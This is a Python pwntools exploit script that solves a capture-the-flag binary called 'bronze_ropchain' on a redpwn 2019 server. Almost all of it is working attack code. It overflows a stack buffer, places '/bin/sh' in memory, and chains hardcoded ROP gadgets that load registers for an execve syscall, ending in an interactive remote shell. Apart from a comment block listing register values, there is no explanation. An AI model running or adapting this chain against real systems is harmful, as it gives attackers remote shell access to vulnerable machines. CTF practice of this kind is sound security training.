from pwn import *

#p = process('./bronze_ropchain')
p = remote('chall2.2019.redpwn.net', 4004)
t = 0.05

syscall = 0x0806dd22
fgets_strcpy = 0x0804895b

pop_ecx_ebx_ret = 0x0806ef52
pop_esi_edi_ret = 0x08049b2a
inc_eax_ret = 0x0807c3b9
inc_esi_ret = 0x08052be6
inc_edi_ret = 0x08049ce4
mov_eax_2_ret = 0x08092db0

binsh = 0x080d80a0
global_offset_table = 0x080da000

payload = ''
payload += 'a'*0x18
payload += p32(binsh+0x408)
payload += p32(fgets_strcpy)

p.sendline(payload)
sleep(t)
p.send('\x00')
sleep(t)

'''
pop ecx
pop ebx

mov eax, 2
inc eax X 9

pop esi
pop edi
inc esi
inc edi
call large dword ptr gs:10h

eax <- 0xb                     ( sys_execve )
ebx <- 0x080d8108 <- '/bin/sh' ( arg1 )
ecx <- 0x080d8140 <- 0x0       ( arg2 )
edx <- 0x0                     ( arg3 )
edi <- 0x080da000 <- 0         ( global_offset_table )
esi <- 0x080da000 <- 0         ( global_offset_table )
'''

payload = ''
payload += 'a'*0x18 # dummy
payload += 'aaaa' # ebp
payload += p32(pop_ecx_ebx_ret)
payload += p32(binsh+0xa0) # address that point null byte
payload += p32(binsh+0x68) # address that point /bin/sh\x00 string
payload += p32(mov_eax_2_ret)
for i in range(9):
	payload += p32(inc_eax_ret)

payload += p32(pop_esi_edi_ret)
payload += p32(global_offset_table-0x1) # bypass null byte
payload += p32(global_offset_table-0x1) # bypass null byte
payload += p32(inc_esi_ret)
payload += p32(inc_edi_ret)
payload += p32(syscall)
payload += '/bin/sh\x00'

p.sendline(payload)
sleep(t)

p.send('\x00') # set edx 0x0

p.interactive()
